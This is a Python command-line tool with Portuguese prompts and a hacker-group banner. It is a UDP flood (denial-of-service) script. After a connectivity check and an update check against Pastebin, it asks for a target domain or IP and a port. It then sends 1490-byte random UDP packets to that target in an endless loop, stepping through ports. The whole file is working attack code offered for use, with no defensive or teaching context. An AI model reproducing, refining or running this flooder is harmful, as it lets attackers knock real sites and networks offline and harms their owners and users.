# Version 1.0
# coded By FuckTR3M and Paizao027
# copyright(please dont use my code without lience)
# Primeiro Comando da Web
from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
################################################################################
banner=Fore.BLUE+'''
  _____   _______          __
 |  __ \ / ____\ \        / /
 | |__) | |     \ \  /\  / /
 |  ___/| |      \ \/  \/ /
 | |    | |____   \  /\  /
 |_|     \_____|   \/  \/
 
'''+Fore.RESET
credit=(Fore.GREEN+
'''                                                                     Author : FuckTR3M and Paizao027
                                                                     Feito Para: Primeiro Comando da Web [PCW] 
                                                                     Versao: 1.0
                                                                     Autorizacao: PCW CORPORATION LTDA
	                                                             Github: NULL TEMP
	                                                             Please contact us in github page                                                           
'''+Fore.RESET)
################################################################################
#platform info
uname=system()
if uname=="Windows":
	cmd='cls'
else :
	cmd='clear'
os.system(cmd)
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
def chech_con():
	try:
		request.urlopen('https://www.google.co.in/',timeout=3)
	except KeyboardInterrupt:
		print(Fore.RED + "Parado Pelo Usuario" + Fore.RESET)
		exit()
	except:
		print(Fore.RED+'Desculpa, Conexão Mal Sucedida'+Fore.RESET)
		exit()
def update():
	import urllib.request as urequest
	from bs4 import BeautifulSoup as soup
	page=urequest.urlopen('https://pastebin.com/G7gFkwfb').read()
	soup=soup(page,'html.parser')
	version=soup.find('div',class_='de1').text
	if version>de_version:
		import webbrowser
		print(Fore.GREEN + "Version " + Fore.MAGENTA + version + Fore.GREEN + " is Avaiable")
		print(Fore.RED + "Desculpe, Atualize o Programa")
		print("Redirecting...." + Fore.RESET)
		time.sleep(3)
		webbrowser.open('https://github.com/BOT-CODER/SniperMan/')
		exit()
	else:
		pass
try:
	print(Fore.GREEN+" Checando Sua Internet "+Fore.RESET)
	time.sleep(2)
	chech_con()
	update()
	os.system(cmd)
except KeyboardInterrupt:
	print(Fore.RED + "Parado Pelo Usuário" + Fore.RESET)
	exit()
try:
	while True:
		print(banner)
		print(credit)
		print(Fore.RED+"1. Domínio Do Site\n2. Endereço IP\n3. Sair"+Fore.RESET)
		opt=str(input(Fore.GREEN+"\nEscolha Um Numero: "+Fore.RESET))
		if opt=='1':
			domain=str(input(Fore.GREEN+"Escreva o Site (ex:google.com):"+Fore.RESET))
			ip=socket.gethostbyname(domain)
			break
		elif opt=='2':
			ip = input(Fore.GREEN+"Endereço IP : "+Fore.RESET)
			break
		elif opt=='3':
			time.sleep(1)
			print(Fore.RED+"Você está Saindo"+Fore.RESET)
			exit()
		else:
			print(Fore.RED+'Número Invalido'+Fore.RESET)
			time.sleep(2)
			os.system(cmd)
	port =int(input(Fore.GREEN+"Número da Porta : "+Fore.RESET))
	os.system(cmd)
	print(Fore.GREEN+"Inicializando....")
	for i in tqdm(range(10000)):
		print(end='\r')
	time.sleep(4)
	print('Começando...')
	time.sleep(4)
	sent = 0
except Exception as e:
	print(Fore.RED+"Something Went Wrong!")
	print("Reason:",e,Fore.RESET)
	exit()
try:
	while True:
		sock.sendto(bytes, (ip,port))
		sent=sent+1
		port=port+1
		print(Fore.GREEN+ "Enviando %s packet para %s Porta:%s" % (sent, ip, port))
		if port==65534:
			port=1
		elif port==1900:
			port=1901
except Exception as e:
	print(Fore.RED+"Exited\nReason: ",e,Fore.RESET)
except KeyboardInterrupt:
	print(Fore.RED+"\nParado Pelo Usuário"+Fore.RESET)
